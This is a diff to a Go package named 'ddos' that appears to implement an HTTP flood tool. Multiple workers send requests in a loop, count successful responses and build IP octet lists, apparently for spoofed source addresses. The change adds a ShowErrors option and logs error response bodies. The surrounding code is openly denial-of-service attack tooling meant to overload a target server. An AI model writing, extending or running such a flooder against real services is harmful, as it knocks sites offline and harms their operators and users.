@@ -1,7 +1,9 @@
 package ddos
 
 import (
+	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
 	"strconv"
@@ -14,12 +16,13 @@ type DDOS struct {
 	ipConstructor   []string
 	working         bool
 
+	ShowErrors  bool
 	successRate int64
 	totalReqs   int64
 }
 
 // Creates dos creator. Number of workers directly affects number of requests
-func New(numberOfWorkers int) (*DDOS, error) {
+func New(numberOfWorkers int, showErrors bool) (*DDOS, error) {
 	if numberOfWorkers < 1 {
 		return nil, fmt.Errorf("number of workers cannot be less than 0")
 	}
@@ -27,7 +30,7 @@ func New(numberOfWorkers int) (*DDOS, error) {
 	for i := range 255 {
 		ipConstructor = append(ipConstructor, strconv.Itoa(i))
 	}
-	return &DDOS{numberOfWorkers: numberOfWorkers, stop: make(chan struct{}), ipConstructor: ipConstructor}, nil
+	return &DDOS{numberOfWorkers: numberOfWorkers, stop: make(chan struct{}), ipConstructor: ipConstructor, ShowErrors: showErrors}, nil
 }
 
 // Starts dos
@@ -59,11 +62,20 @@ func (d *DDOS) startWorker(req *http.Request) {
 			client := http.Client{}
 			resp, err := client.Do(req)
 			if err != nil {
-				log.Println(err)
+				if d.ShowErrors {
+					log.Println(err)
+				}
 				continue
 			}
 			if resp.StatusCode != 200 {
-				log.Println(resp.StatusCode)
+				if d.ShowErrors {
+					log.Println(resp.StatusCode)
+					toPrint := map[string]string{}
+					bytes, _ := io.ReadAll(resp.Body)
+					_ = json.Unmarshal(bytes, &toPrint)
+					log.Println(toPrint)
+				}
+
 				continue
 			}
 			atomic.AddInt64(&d.successRate, 1)
